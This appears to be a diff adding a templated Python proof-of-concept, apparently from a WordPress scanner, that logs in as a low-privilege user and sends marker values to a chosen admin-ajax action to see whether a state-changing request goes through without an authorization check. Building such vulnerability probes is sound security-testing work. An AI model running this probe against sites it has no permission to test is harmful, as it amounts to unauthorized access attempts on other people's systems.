@@ -1,0 +1,35 @@
+import requests
+from wp_login import wp_login
+
+TARGET = "{{ target_url }}"
+ACTION = "{{ ajax_action }}"
+USERNAME = "{{ test_username }}"
+PASSWORD = "{{ test_password }}"
+
+session = requests.Session()
+login = wp_login(session, TARGET, USERNAME, PASSWORD)
+if not login.success:
+    print(f"[-] FAILURE: login failed for {USERNAME}: {login.reason}")
+    raise SystemExit(0)
+
+marker = "squadrone_marker"
+resp = session.post(
+    f"{TARGET}/wp-admin/admin-ajax.php",
+    data={
+        "action": ACTION,
+        "title": marker,
+        "name": marker,
+        "value": marker,
+        {{ extra_params }}
+    },
+    timeout=20,
+)
+
+body = resp.text[:700]
+blocked = any(marker in body.lower() for marker in ("forbidden", "unauthorized", "not allowed", "-1", "nonce"))
+if resp.status_code in (200, 201, 204) and not blocked:
+    print(f"[+] SUCCESS: low-privilege request to {ACTION} was accepted")
+    print(f"    status={resp.status_code} body={body[:400]}")
+else:
+    print(f"[-] FAILURE: state-changing request rejected or inconclusive")
+    print(f"    status={resp.status_code} body={body[:400]}")
